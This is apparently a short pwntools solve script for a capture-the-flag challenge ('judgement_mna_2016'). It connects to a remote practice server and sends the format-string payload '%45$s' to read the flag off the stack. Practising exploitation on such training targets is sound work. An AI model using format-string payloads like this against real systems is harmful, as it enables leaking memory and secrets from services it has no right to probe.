from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('judgement_mna_2016')
io = remote('node4.buuoj.cn', 25288)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
# libc = ELF('libc-2.27.so')
elf = ELF('judgement_mna_2016')
flag = elf.sym['flag']

payload = b'%45$s'
io.sendlineafter('Flag judgment system\nInput flag >> ', payload)
io.recv()
